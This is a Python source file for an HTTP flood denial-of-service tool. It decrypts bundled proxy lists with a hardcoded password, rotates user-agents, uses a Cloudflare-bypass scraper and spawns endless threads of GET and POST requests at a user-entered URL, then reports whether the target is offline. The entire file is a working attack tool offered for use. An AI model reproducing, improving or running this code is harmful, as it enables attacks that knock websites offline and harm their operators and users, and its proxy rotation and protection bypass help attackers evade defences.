import colorama
from colorama import Style
import threading
import random
import requests
import cfscrape
import os
import pyAesCrypt
import time
from numba import prange

os.system("clear")

# Получение User-Agent
with open('useragent') as file:
    headersp = ''.join(file.readlines()).strip().split('\n')

# Шифрование и получение прокси
filedecrypthttp = "proxyhttp.crp"
filedecryptsocks = "proxysocks.crp"
password = "0xdrqdsdwgfegvefgtruoobcdsm"


def decryptionhttp():
    buffer_size = 512 * 1024
    pyAesCrypt.decryptFile(str(filedecrypthttp), str(os.path.splitext(filedecrypthttp)[0]), password, buffer_size)


decryptionhttp()

with open('proxyhttp') as file:
    proxy_http = ''.join(file.readlines()).strip().split('\n')
os.remove("proxyhttp")


def decryptionsocks():
    buffer_size = 512 * 1024
    pyAesCrypt.decryptFile(str(filedecryptsocks), str(os.path.splitext(filedecryptsocks)[0]), password, buffer_size)


decryptionsocks()

with open('proxysocks') as file:
    proxy_socks = ''.join(file.readlines()).strip().split('\n')
os.remove("proxysocks")


# Аттака
def dos1_1(target, proxy):
    s = cfscrape.create_scraper()

    useragent = random.choice(headersp)
    header = {'accept': '*/*', 'user-agent': useragent}

    useragent2 = random.choice(headersp)
    header2 = {'accept': '*/*', 'user-agent': useragent2}

    proxiessockshttp = {
        'http': f'socks5://{proxy}',
        'https': f'socks5://{proxy}'
    }

    try:
        s.get(target, headers=header, proxies=proxiessockshttp)
    except:
        pass

    try:
        s.post(target, headers=header2, proxies=proxiessockshttp)
    except:
        pass


def dos1_2(target, proxy):
    s = cfscrape.create_scraper()

    useragent = random.choice(headersp)
    header = {'accept': '*/*', 'user-agent': useragent}

    useragent2 = random.choice(headersp)
    header2 = {'accept': '*/*', 'user-agent': useragent2}

    proxieshttphttp = {
        'http': f'http://{proxy}',
        'https': f'http://{proxy}'
    }

    try:
        s.get(target, headers=header, proxies=proxieshttphttp)
    except:
        pass

    try:
        s.post(target, headers=header2, proxies=proxieshttphttp)
    except:
        pass


def dos2(target):
    while True:
        useragent = random.choice(headersp)
        header = {'user-agent': useragent}
        try:
            requests.get(target, headers=header)
            requests.post(target, headers=header)
        except:
            pass


threads = 20
print("\\-\          //-/    //-/\\-\       ==========     ||====\-\   //=====\-\ ||======-\     ")
print(" \\-\        //-/    //-/  \\-\     ||-|     ||-|   ||    |=-|  ||     |-| || _____|-|    ")
print("  \\-\      //-/    //-/    \\-\    ||-|     ||-|   ||    |=-|  ||     |-| ||____             ")
print("   \\-\    //-/    //========\\-\   ||=========     ||    |=-|  ||     |-|      || |-|    ")
print("    \\-\  //-/    //-/        \\-\  ||-|     \\-\    ||    |=-|  ||     |-|   ___|| |-|   ")
print("     \\-\//-/    //-/          \\-\ ||-|      \\-\   ||====/-/   \\=====/-/ ||======|-| \n")
print("Creator: VaRaMBaZ")
print("Version: 1.6.6; Optimazed attack \n")

url = input("URL: ")
if not url.__contains__("http"):
    exit(colorama.Fore.RED + "URL doesnt contains http or https!")

if not url.__contains__("."):
    exit(colorama.Fore.RED + "Invalid domain")

proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
print("")

if proxyuseage == 1:
    while True:
        for number_socks in proxy_http:
            threading.Thread(target=dos1_1, args=(url, number_socks,)).start()
        for number_http in proxy_socks:
            threading.Thread(target=dos1_2, args=(url, number_http,)).start()
else:
    while True:
        threading.Thread(target=dos2, args=(url,)).start()
print(Style.RESET_ALL)

while True:
    useragent = random.choice(headersp)
    header = {'user-agent': useragent}

    proxyagenthttp = random.choice(proxy_http)
    proxieshttphttp = {
        'http': f'http://{proxyagenthttp}',
        'https': f'http://{proxyagenthttp}',
    }
    try:
        checksite = requests.post(url, headers=header, proxies=proxieshttphttp)
        if checksite.status_code >= 500:
            statustext = "OFF_LINE"
        else:
            statustext = "ON_LINE"
    except:
        pass
    print("\r Check Site | Status: ", checksite.status_code, " | ", statustext, end='')
